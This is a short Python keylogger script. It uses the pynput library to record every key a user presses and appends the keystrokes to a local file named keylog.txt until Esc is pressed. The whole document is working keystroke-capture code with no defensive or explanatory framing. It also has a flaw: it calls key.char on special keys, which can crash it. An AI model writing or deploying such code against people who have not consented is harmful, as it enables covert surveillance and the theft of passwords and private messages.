from pynput import keyboard
import time

# A list to store the keys pressed
keys_pressed = []

# The function to be called when a key is pressed
def on_key_press(key):
    keys_pressed.append(key)
    write_to_file(keys_pressed)

# The function to be called when a key is released
def on_key_release(key):
    if key == keyboard.Key.esc:
        # If the Esc key is pressed, stop the listener
        return False

# The function to write the keys pressed to a file
def write_to_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.shift:
                continue
            else:
                f.write(key.char)
    keys_pressed.clear()

# Start the listener
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()